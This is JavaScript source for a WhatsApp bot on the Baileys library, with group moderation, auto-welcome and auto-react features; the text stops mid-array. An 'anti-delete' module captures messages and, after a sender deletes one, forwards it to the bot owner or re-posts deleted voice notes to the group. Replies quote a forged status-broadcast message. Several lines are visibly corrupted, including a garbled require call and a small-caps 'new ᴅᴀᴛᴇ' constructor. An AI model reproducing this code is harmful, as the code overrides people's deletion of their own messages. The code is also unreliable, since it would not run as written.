// base by @phistar
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const FormData = require('form-data');
const chalk = require('chalk')
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const translate = require('@vitalets/google-translate-api');
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const yts = require("yt-search");
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require(ZORO_B-Nhild-ZOROprocess")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const tempMailData = {};
const settings = require('./phistarbot.js'); // Import settings
if (!global.savedVideos) global.savedVideos = {};
//bug database 
var wkwk = fs.readFileSync(`./16/p.mp3`)
var xsteek = fs.readFileSync(`./16/p.webp`)
var o = fs.readFileSync(`./16/p.jpg`)
//database
var antilinkall = fs.readFileSync("database/antilinkall.json", "utf8");
var _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
var owner = fs.readFileSync("database/owner.json", "utf8");
var premium = fs.readFileSync("database/premium.json", "utf8");
console.log(premium); 

let _afk = {};
let hit = {};

// Function to safely read and parse JSON files
function readJsonFile(filePath, defaultValue = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const rawData = fs.readFileSync(filePath, 'utf8').trim();
            return rawData ? JSON.parse(rawData) : defaultValue;
        } else {
            // Create file if it doesn't exist
            fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
            return defaultValue;
        }
    } catch (error) {
        console.error(`Error processing ${filePath}:`, error.message);
        return defaultValue;
    }
}
_afk = readJsonFile('./database/afk-user.json');
hit = readJsonFile('./database/total-hit-user.json');

// Autoreply
var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'));
var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'));
var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'));
var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'));
var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'));
var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'));

// Time variables
var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss');
var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY');
var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss');

// Main Module Export
module.exports = PhistarBotInc = async (PhistarBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m;

        var body = (m.mtype === 'conversation') ? m.message.conversation :
            (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
            (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
            (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
            (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
            (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyphistar.selectedRowId :
            (m.mtype == 'templateButtonreplyphistarMessage') ? m.message.templateButtonreplyphistarMessage.selectedId :
            (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyphistar.selectedRowId || m.text) : '';
            
  const budy = (typeof m.text === 'string' ? m.text : '');

var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 

                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 

                      : global.prefa ?? global.prefix

//------ Prefix Function

    const CMD = body.startsWith(prefix)

    const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
      const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const ytdl = require('ytdl-core');
        const botNumber = await PhistarBotInc.decodeJid(PhistarBotInc.user.id);
        const itsMe = m.sender == botNumber ? true : false;
        const sender = m.sender;
        const text = q = args.join(" ");
        const from = m.key.remoteJid;
        const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
            (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
            (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isImage = (type == 'imageMessage');
        const isVideo = (type == 'videoMessage');
        const isAudio = (type == 'audioMessage');
        const isText = (type == 'textMessage');
        const isSticker = (type == 'stickerMessage');
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.isGroup
const groupMetadata = isGroup ? await PhistarBotInc.groupMetadata(m.chat).catch(e => {}) : {}
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? groupMetadata.participants : []
const groupAdmins = isGroup ? await getGroupAdmins(participants) : []
const isBotAdmins = isGroup ? groupAdmins.includes(PhistarBotInc.decodeJid(PhistarBotInc.user.id)) : false
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false
const groupOwner = isGroup ? groupMetadata.owner || groupAdmins[0] : ''
const isGroupOwner = isGroup ? [groupOwner, ...groupAdmins].includes(m.sender) : false
        // Load Owner Data  
        let owner = [];
        try {
            owner = JSON.parse(fs.readFileSync('./WABOTowners.json', 'utf-8'));
        } catch (err) {
            console.error("Error reading owner file:", err);
        }

        const isCreator = [botNumber, ...owner]
            .map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(sender);
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = PhistarBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? PhistarBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || PhistarBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(PhistarBotInc, m, premium);
        // Read the current Anti-Link group list
const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');
let chatbot = false; // Default state of the chatbot

if (m.isGroup && antilinkGroups.includes(m.chat)) {
    const linkRegex = /https?:\/\/[^\s]+/; // Regex to detect links
    if (linkRegex.test(m.text)) {
        // Delete the message
        await PhistarBotInc.sendMessage(m.chat, { delete: m.key });

        // Warn the sender
        replyphistar(`⚠️ Links are not allowed in this group, @${m.sender.split('@')[0]}!`);

        // Optional: Remove the sender (uncomment to enable)
        // await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}
        
 const qtext2 = { key: {fromMe: false, participant: `13135550002@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "© 𝑵𝑶𝑮𝑨𝑴𝑬 𝑻𝑬𝑪𝑯 " }}}

       
        
const replyphistar = async (teks) => {
    try {
        await PhistarBotInc.sendMessage(m.chat, {   
            text: teks,  
            contextInfo: {  
                forwardingScore: 2,  
                isForwarded: true  
            }  
        }, { quoted: qtext2 });  

    } catch (error) {  
        console.error('Reply error:', error);  
        // Fallback simple message  
        await PhistarBotInc.sendMessage(m.chat, {  
            text: teks,  
            mentions: [m.sender]  
        }, { quoted: qtext2 });  
    }
};

global.userSessions = {};  // Initialize user sessions globally




// Global object to track user cooldowns
const userCooldowns = {};


let antidelete = true; // Enable by default
// --- ANTI-DELETE CONFIG ---
const MAX_TRACKED_MESSAGES = 1000;
const MESSAGE_TTL = 5 * 60 * 1000;
const ALERT_COOLDOWN = 10000; // 10 seconds cooldown
// --------------------------

// SINGLE BIND: prevent multiple registrations after reconnect/hot-reload
if (typeof global.antideleteInitialized === 'undefined') {
    global.antideleteInitialized = true;
    
    // Store tracked messages with timestamp
    const trackedMessages = new Map();
    // Track recently alerted deletions
    const alertedDeletions = new Map();
    // Get bot number
    const botNumber = await PhistarBotInc.decodeJid(PhistarBotInc.user.id);

    // Improved message tracking
    PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const message = chatUpdate.messages[0];
            if (!message || message.key.fromMe) return;

            const messageId = message.key.id;
            const sender = message.key.remoteJid;
            const chatId = message.key.remoteJid;
            const isGroup = chatId.endsWith('@g.us');
            
            // Extract message content from various types
            let content = '';
            let mediaType = 'text';
            let mediaData = null;
            
            // Text messages
            if (message.message?.conversation) {
                content = message.message.conversation;
            } else if (message.message?.extendedTextMessage?.text) {
                content = message.message.extendedTextMessage.text;
            } 
            // Media with captions
            else if (message.message?.imageMessage) {
                content = message.message.imageMessage.caption || '';
                mediaType = 'image';
                mediaData = message.message.imageMessage;
            } else if (message.message?.videoMessage) {
                content = message.message.videoMessage.caption || '';
                mediaType = 'video';
                mediaData = message.message.videoMessage;
            } else if (message.message?.documentMessage) {
                content = message.message.documentMessage.caption || '';
                mediaType = 'document';
                mediaData = message.message.documentMessage;
            } 
            // Voice messages (using the correct Baileys properties)
            else if (message.message?.audioMessage) {
                if (message.message.audioMessage.ptt) {
                    content = 'Voice note';
                    mediaType = 'ptt';
                } else {
                    content = 'Audio message';
                    mediaType = 'audio';
                }
                mediaData = message.message.audioMessage;
            }
            
            // Track messages with content or media
            if ((content && content.trim().length > 0) || mediaType !== 'text') {
                cleanupOldMessages();
                
                trackedMessages.set(messageId, {
                    sender,
                    chatId,
                    content: content.trim(),
                    timestamp: Date.now(),
                    isGroup,
                    mediaType,
                    mediaData,
                    originalMessage: message // Store the original message for proper forwarding
                });
                
                // Enforce size limit
                if (trackedMessages.size > MAX_TRACKED_MESSAGES) {
                    const oldestId = Array.from(trackedMessages.entries())
                        .reduce((oldest, [id, data]) => 
                            data.timestamp < trackedMessages.get(oldest).timestamp ? id : oldest, 
                        Array.from(trackedMessages.keys())[0]);
                    trackedMessages.delete(oldestId);
                }
            }
        } catch (err) {
            console.error('Error tracking messages:', err);
        }
    });

    // Cleanup function
    function cleanupOldMessages() {
        const now = Date.now();
        for (const [messageId, data] of trackedMessages.entries()) {
            if (now - data.timestamp > MESSAGE_TTL) {
                trackedMessages.delete(messageId);
            }
        }
        for (const [messageId, alertTime] of alertedDeletions.entries()) {
            if (now - alertTime > ALERT_COOLDOWN) {
                alertedDeletions.delete(messageId);
            }
        }
    }

    // Periodic cleanup
    setInterval(cleanupOldMessages, 60000);

    // Unified deletion handler with proper deduplication
    async function handleMessageDeletion(update) {
        try {
            const messageId = update.key.id;
            const chatId = update.key.remoteJid;
            
            // Check if we've recently alerted about this deletion
            if (alertedDeletions.has(messageId)) {
                return; // Already alerted, skip processing
            }
            
            const deletedMessage = trackedMessages.get(messageId);
            if (!deletedMessage) return;
            
            const { sender, content, timestamp, isGroup, mediaType, mediaData, originalMessage } = deletedMessage;
            const senderName = sender.split('@')[0];
            
            // Mark as alerted to prevent duplicates
            alertedDeletions.set(messageId, Date.now());
            
            // Prepare alert message
            let alertText = `🚨 *ᴀɴᴛɪ-ᴅᴇʟᴇᴛᴇ ᴀʟᴇʀᴛ* 🚨\n\n` +
                           `👤 *ᴜsᴇʀ:* @${senderName}\n` +
                           `📅 *ᴛɪᴍᴇ:* ${new ᴅᴀᴛᴇ(timestamp).toLocaleTimeString()}\n`;
            
            // Add content based on media type
            if (mediaType === 'text') {
                alertText += `💬 *ᴅᴇʟᴇᴛᴇᴅ ᴍᴇssᴀɢᴇ:* "${content}"`;
            } else {
                alertText += `📁 *ᴅᴇʟᴇᴛᴇᴅ ${mediaType.toUpperCase()}*: ${content || '[No caption]'}`;
            }
            
            try {
                // Handle different scenarios based on your requirements
                if (isGroup) {
                    // GROUP: For voice notes, send alert and resend in group
                    if (mediaType === 'ptt') {
                        await PhistarBotInc.sendMessage(chatId, { 
                            text: alertText,
                            mentions: [sender]
                        });
                        
                        // Resend the voice note to the group
                        await forwardVoiceNote(chatId, originalMessage, senderName);
                    } 
                    // For normal text messages, send alert to owner's DM
                    else if (mediaType === 'text') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                    }
                    // For other media types (image, video, document, non-ptt audio), ignore
                } else {
                    // DM: For normal text messages, send alert to bot owner's DM
                    if (mediaType === 'text') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                    }
                    // For voice notes in DM, send alert to bot owner's DM
                    else if (mediaType === 'ptt') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                        await forwardVoiceNote(botNumber, originalMessage, senderName);
                    }
                    // For other media types in DM, ignore
                }
            } catch (error) {
                console.error('Error sending alert:', error);
                // Fallback to bot owner for text messages only
                if (mediaType === 'text') {
                    await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                }
            }
            
            // Clean up
            trackedMessages.delete(messageId);
            
        } catch (err) {
            console.error('Error in deletion handler:', err);
        }
    }

    // Function to properly forward voice notes using Baileys forwarding
    async function forwardVoiceNote(targetChat, originalMessage, senderName) {
        try {
            // Use Baileys' built-in forwarding functionality
            await PhistarBotInc.sendMessage(targetChat, {
                forward: originalMessage,
                mentions: [senderName + '@s.whatsapp.net']
            });
        } catch (error) {
            console.error('Error forwarding voice note:', error);
            
            // Fallback: try to download and resend the audio
            try {
                const audioData = originalMessage.message.audioMessage;
                const stream = await downloadMediaMessage(originalMessage, 'buffer', {});
                
                await PhistarBotInc.sendMessage(targetChat, {
                    audio: stream,
                    ptt: audioData.ptt || false,
                    mimetype: audioData.mimetype || 'audio/ogg; codecs=opus',
                    mentions: [senderName + '@s.whatsapp.net']
                });
            } catch (fallbackError) {
                console.error('Fallback also failed:', fallbackError);
                // Final fallback: send a text message
                await PhistarBotInc.sendMessage(targetChat, {
                    text: `🔊 Could not resend voice note from @${senderName}`
                });
            }
        }
    }

    // Helper function to download media (if needed for fallback)
    async function downloadMediaMessage(message, type, options) {
        // This would need to be implemented based on your Baileys version
        // For now, we'll just throw an error to use the fallback
        throw new Error('Download not implemented');
    }

    // Detect deletions via messages.update
    PhistarBotInc.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update?.messageStubType === 1) { // Message deleted
                await handleMessageDeletion(update);
            }
        }
    });

    // Alternative detection via message-receipt.update
    PhistarBotInc.ev.on('message-receipt.update', async (receipts) => {
        for (const receipt of receipts) {
            if (receipt.receipt?.type === 'delete') {
                await handleMessageDeletion(receipt);
            }
        }
    });

    console.log('Anti-delete system initialized successfully');
} else {
    console.log('Anti-delete system already initialized, skipping duplicate binding');
}     
// Add this in your message processing logic (not inside the switch/case block)
const muteData = JSON.parse(fs.readFileSync('./database/muteuser.json', 'utf-8') || '{}')

// Check if the sender is muted in the group
if (m.isGroup && muteData[m.chat]?.[m.sender]?.expires > Date.now()) {
    // Delete the message
    await PhistarBotInc.sendMessage(m.chat, { delete: m.key })
    // Notify the user privately
    await PhistarBotInc.sendMessage(m.sender, {
        text: `🚫 You are muted in ${groupMetadata.subject} until ${new Date(muteData[m.chat][m.sender].expires).toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' })}. Your messages will be deleted.`
    })
}
// Add this in your message processing logic (not inside the switch/case block)
const antilinkKickGroups = JSON.parse(fs.readFileSync('./database/antilinkkick.json', 'utf-8') || '[]')

// Check if the message is in a group and anti-link-kick is enabled
if (m.isGroup && antilinkKickGroups.includes(m.chat)) {
    // Regular expression to detect URLs
    const urlPattern = /(https?:\/\/[^\s]+)/gi
    if (m.text && urlPattern.test(m.text)) {
        // Delete the message
        await PhistarBotInc.sendMessage(m.chat, { delete: m.key })
        
        // Kick the sender
        if (isBotAdmins) {
            await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                .then((res) => replyphistar("🚫 Link detected! Message deleted and user removed from the group."))
                .catch((err) => replyphistar("❌ Error removing user: " + JSON.stringify(err)))
        } else {
            replyphistar("❌ Bot needs admin privileges to remove users.")
        }
    }
}
// Add this in your message processing logic (not inside the switch/case block)
const antiwordGroups = JSON.parse(fs.readFileSync('./database/antiword.json', 'utf-8') || '{}')
const antiwordUsers = JSON.parse(fs.readFileSync('./database/antiword_users.json', 'utf-8') || '{}')

// Check if the message is in a group and anti-word is enabled
if (m.isGroup && antiwordGroups[m.chat]?.enabled && m.text) {
    // Ignore messages from admins or the bot itself
    if (isAdmins || m.sender === PhistarBotInc.user.id) return

    // Check for banned words
    const messageText = m.text.toLowerCase()
    const bannedWords = antiwordGroups[m.chat].bannedWords || []
    const foundWord = bannedWords.find(word => messageText.includes(word))

    if (foundWord) {
        // Delete the message
        await PhistarBotInc.sendMessage(m.chat, { delete: m.key })

        // Initialize user warnings
        if (!antiwordUsers[m.chat]) antiwordUsers[m.chat] = {}
        if (!antiwordUsers[m.chat][m.sender]) antiwordUsers[m.chat][m.sender] = 0

        // Increment warning count
        antiwordUsers[m.chat][m.sender] += 1
        const warningCount = antiwordUsers[m.chat][m.sender]

        // Save updated warnings
        fs.writeFileSync('./database/antiword_users.json', JSON.stringify(antiwordUsers, null, 2))

        if (warningCount < 3) {
            // Send warning message
            const warningsLeft = 3 - warningCount
            await replyphistar(`🚫 Banned word "${foundWord}" detected! Your message has been deleted. You have ${warningsLeft} warning(s) left before being removed.`)
        } else {
            // Kick user after 3 warnings
            if (isBotAdmins) {
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                    .then(() => {
                        replyphistar(`🚫 User ${m.sender.split('@')[0]} has been removed for using banned words after 3 warnings.`)
                        // Reset warnings
                        delete antiwordUsers[m.chat][m.sender]
                        fs.writeFileSync('./database/antiword_users.json', JSON.stringify(antiwordUsers, null, 2))
                    })
                    .catch((err) => replyphistar(`❌ Error removing user: ${JSON.stringify(err)}`))
            } else {
                replyphistar("❌ Bot needs admin privileges to remove users.")
            }
        }
    }
}
// Add this in your message processing logic (not inside the switch/case block)
const antilinkWarnGroups = JSON.parse(fs.readFileSync('./database/antilinkwarn.json', 'utf-8') || '[]')
const antilinkWarnUsers = JSON.parse(fs.readFileSync('./database/antilinkwarn_users.json', 'utf-8') || '{}')

// Check if the message is in a group and anti-link-warn is enabled
if (m.isGroup && antilinkWarnGroups.includes(m.chat)) {
    // Regular expression to detect URLs
    const urlPattern = /(https?:\/\/[^\s]+)|t\.me\/[^\s]+|wa\.me\/[^\s]+/gi
    if (m.text && urlPattern.test(m.text)) {
        // Delete the message
        await PhistarBotInc.sendMessage(m.chat, { delete: m.key })

        // Initialize user warnings if not present
        if (!antilinkWarnUsers[m.chat]) antilinkWarnUsers[m.chat] = {}
        if (!antilinkWarnUsers[m.chat][m.sender]) antilinkWarnUsers[m.chat][m.sender] = 0

        // Increment warning count
        antilinkWarnUsers[m.chat][m.sender] += 1
        const warningCount = antilinkWarnUsers[m.chat][m.sender]

        // Save updated warnings to file
        fs.writeFileSync('./database/antilinkwarn_users.json', JSON.stringify(antilinkWarnUsers, null, 2))

        if (warningCount < 3) {
            // Send warning message
            const warningsLeft = 3 - warningCount
            await replyphistar(`🚫 Link detected! Your message has been deleted. You have ${warningsLeft} warning(s) left before being removed.`)
        } else {
            // Kick user after 3 warnings
            if (isBotAdmins) {
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                    .then((res) => {
                        replyphistar(`🚫 User ${m.sender.split('@')[0]} has been removed for posting links after 3 warnings.`)
                        // Reset warnings for the user
                        delete antilinkWarnUsers[m.chat][m.sender]
                        fs.writeFileSync('./database/antilinkwarn_users.json', JSON.stringify(antilinkWarnUsers, null, 2))
                    })
                    .catch((err) => replyphistar(`❌ Error removing user: ${JSON.stringify(err)}`))
            } else {
                replyphistar("❌ Bot needs admin privileges to remove users.")
            }
        }
    }
}
// Add this in your message processing logic (not inside the switch/case block)
const antispamGroups = JSON.parse(fs.readFileSync('./database/antispam.json', 'utf-8') || '[]')
const antispamUsers = JSON.parse(fs.readFileSync('./database/antispam_users.json', 'utf-8') || '{}')

// Check if the message is in a group and anti-spam is enabled
if (m.isGroup && antispamGroups.includes(m.chat)) {
    // Ignore messages from admins or the bot itself
    if (isAdmins || m.sender === PhistarBotInc.user.id) return

    // Initialize user data for the group
    if (!antispamUsers[m.chat]) antispamUsers[m.chat] = {}
    if (!antispamUsers[m.chat][m.sender]) {
        antispamUsers[m.chat][m.sender] = {
            messages: [],
            warnings: 0
        }
    }

    const userData = antispamUsers[m.chat][m.sender]
    const now = Date.now()

    // Add current message timestamp
    userData.messages.push(now)

    // Remove messages older than 10 seconds
    userData.messages = userData.messages.filter(ts => now - ts < 10000)

    // Check if user sent 5 or more messages in 10 seconds
    if (userData.messages.length >= 5) {
        userData.warnings += 1
        userData.messages = [] // Reset message count after warning

        // Save updated data
        fs.writeFileSync('./database/antispam_users.json', JSON.stringify(antispamUsers, null, 2))

        if (userData.warnings < 3) {
            // Send warning
            const warningsLeft = 3 - userData.warnings
            await replyphistar(`🚫 Spam detected! Please slow down your messages. You have ${warningsLeft} warning(s) left before being removed.`)
        } else {
            // Kick user after 3 warnings
            if (isBotAdmins) {
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                    .then((res) => {
                        replyphistar(`🚫 User ${m.sender.split('@')[0]} has been removed for spamming after 3 warnings.`)
                        // Reset user data
                        delete antispamUsers[m.chat][m.sender]
                        fs.writeFileSync('./database/antispam_users.json', JSON.stringify(antispamUsers, null, 2))
                    })
                    .catch((err) => replyphistar(`❌ Error removing user: ${JSON.stringify(err)}`))
            } else {
                replyphistar("❌ Bot needs admin privileges to remove users.")
            }
        }
    } else {
        // Save updated message timestamps
        fs.writeFileSync('./database/antispam_users.json', JSON.stringify(antispamUsers, null, 2))
    }
}
// In-memory cache to track processed group participant updates
const processedEvents = new Map()

PhistarBotInc.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update
    const autoWelcomeGroups = JSON.parse(fs.readFileSync('./database/autowelcome.json', 'utf-8') || '[]')

    // Check if the group has auto-welcome enabled
    if (autoWelcomeGroups.includes(id) && participants.length > 0) {
        const participant = participants[0] // Process only the first participant
        const timestamp = Date.now()
        const eventKey = `${id}:${action}:${participant}:${timestamp}`

        // Check if this event was already processed
        if (processedEvents.has(eventKey)) return

        // Store the event in the cache with a 10-second expiry to prevent duplicates
        processedEvents.set(eventKey, true)
        setTimeout(() => processedEvents.delete(eventKey), 10000) // Clear after 10 seconds

        try {
            const groupMetadata = await PhistarBotInc.groupMetadata(id)
            const groupName = groupMetadata.subject
            let message

            switch (action) {
                case 'add':
                    message = `👋 ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ *${groupName}*, @${participant.split('@')[0]}! ᴡᴇ'ʀᴇ ɢʟᴀᴅ ʏᴏᴜ'ʀᴇ ʜᴇʀᴇ. ᴘʟᴇᴀsᴇ ғᴏʟʟᴏᴡ ᴛʜᴇ ɢʀᴏᴜᴘ ʀᴜʟᴇs ᴀɴᴅ ᴇɴᴊᴏʏ ʏᴏᴜʀ sᴛᴀʏ!`
                    break
                case 'remove':
                    message = `👋 ɢᴏᴏᴅʙʏᴇ, @${participant.split('@')[0]}! ᴛʜᴀɴᴋs ғᴏʀ ʙᴇɪɴɢ ᴘᴀʀᴛ ᴏғ *${groupName}*. ᴡᴇ ᴡɪsʜ ʏᴏᴜ ᴀʟʟ ᴛʜᴇ ʙᴇsᴛ!`
                    break
                case 'promote':
                    message = `🎉 ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs, @${participant.split('@')[0]}! ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘʀᴏᴍᴏᴛᴇᴅ ᴛᴏ ᴀᴅᴍɪɴ ɪɴ *${groupName}*!`
                    break
                case 'demote':
                    message = `📢 @${participant.split('@')[0]} ʜᴀs ʙᴇᴇɴ ᴅᴇᴍᴏᴛᴇᴅ ғʀᴏᴍ ᴀᴅᴍɪɴ ɪɴ *${groupName}*.`
                    break
                default:
                    return // Skip unknown actions
            }

            if (message) {
                await PhistarBotInc.sendMessage(id, {
                    text: message,
                    mentions: [participant]
                })
                await delay(1000) // 1-second delay for smooth execution
            }
        } catch (err) {
            console.error(`Failed to send message for ${participant} in ${id}:`, err)
        }
    }
})

        
        
let autoReact = false; // Default is off

// Track incoming messages
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // React to the message if auto-react is enabled
        if (autoReact) {
            const randomEmojis = [
                '❤️', '👍', '🎉', '😎', '🔥', '👏', '💡', '✨', '🎈', '🌟', '😊', '😍', '💯', '😅', '🥳', '🤩', '🎶', '💖', '🍀', '🌈',
                '⚡', '💥', '🌺', '🌼', '🌸', '🌻', '🐾', '💌', '💝', '🌷', '🍁', '🍃', '🌿', '🌙', '🪐', '☀️', '🌞', '🌜', '🌑',
                '🌒', '🌓', '🌔', '🌕', '🌖', '🌗', '🌘', '🌚', '✨', '💎', '🖤', '💜', '❤️‍🔥', '💙', '💚', '💛', '🧡', '🤍', '🤎', '💗',
                '💓', '💞', '💘', '💌', '💍', '🔮', '🌍', '🌎', '🌏', '🪴', '🌵', '🌾', '🍂', '🍄', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
                '🍍', '🥥', '🍉', '🍊', '🍋', '🍏', '🍎', '🍍', '🍅', '🥕', '🥔', '🍠', '🌽', '🥒', '🍑', '🍋', '🍒', '🥝', '🫐', '🍜', '🍛',
                '🍝', '🍕', '🍣', '🍤', '🍖', '🍗', '🍠', '🥧', '🍩', '🍪', '🍨', '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🥨', '🥯', '🍪',
                '🍩', '🍪', '🥓', '🍔', '🥪', '🍟', '🥞', '🍣', '🍰', '🥧', '🍇', '🍉', '🥑', '🥥', '🥭', '🍅', '🥦', '🥕', '🥔', '🥗', '🥒',
                '🥥', '🍒', '🍑', '🍋', '🥭', '🍉', '🍇', '🍋', '🥝', '🫐', '🍊', '🍏', '🥕', '🍅', '🥒', '🥔', '🥥', '🍠', '🍞', '🥐', '🍩',
                '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🍪', '🍩', '🍕', '🍜', '🍚', '🍛', '🍕', '🍣', '🍤', '🍔', '🍗', '🍖', '🥓', '🥩',
                '🍿', '🎥', '🎬', '🎧', '🎮', '🎤', '🎵', '🎷', '🎺', '🎸', '🎻', '🎼', '🎶', '🎧', '🎵', '🎶', '🎤', '🎬', '🎮', '🎸', '🎹',
                '🎷', '🎺', '🎼', '🎻', '🎧', '🎮', '🎮', '🧸', '🪀', '🎨', '🖌️', '🎭', '🎪', '🎠', '🎰', '🛹', '🛷', '🏀', '⚽', '🏈', '🎱',
                '🎯', '🎳', '🏏', '🏑', '🏓', '🎾', '🛶', '🚴', '🧗', '🧘', '🏄', '🏇', '⛷️', '🏌️‍♂️', '⛹️‍♀️', '🚣', '🏆', '🎮', '🎲',
                '🎮', '🍕', '🍔', '🍟', '🍗', '🥔', '🥦', '🌽', '🥒', '🥝', '🥭', '🍍', '🍎', '🍊', '🍋', '🥭', '🥑', '🥒', '🌶️', '🍠', '🥔',
                '🍪', '🍩', '🍫', '🍫', '🍪', '🥪', '🥡', '🍜', '🍣', '🍤', '🍙', '🍚', '🍗', '🍖', '🥩', '🥓', '🥨', '🍧', '🍡', '🍪', '🍩',
                '🍜', '🍛', '🍝', '🥝', '🫐', '🍁', '🍃', '🌲', '🌳', '🌴', '🌱', '🪴', '🌾', '🌿', '🌺', '🌼', '🌻', '🌸', '🌷', '🌹', '💐',
                '🍀', '🍁', '🍃', '🌱', '🌿', '🌾', '🌸', '🌺', '🌻', '🌼', '💮', '🍂', '🍃', '🍄', '🌷', '🍁', '🌿', '🎋', '🎋', '🌹', '🌸'
            ];

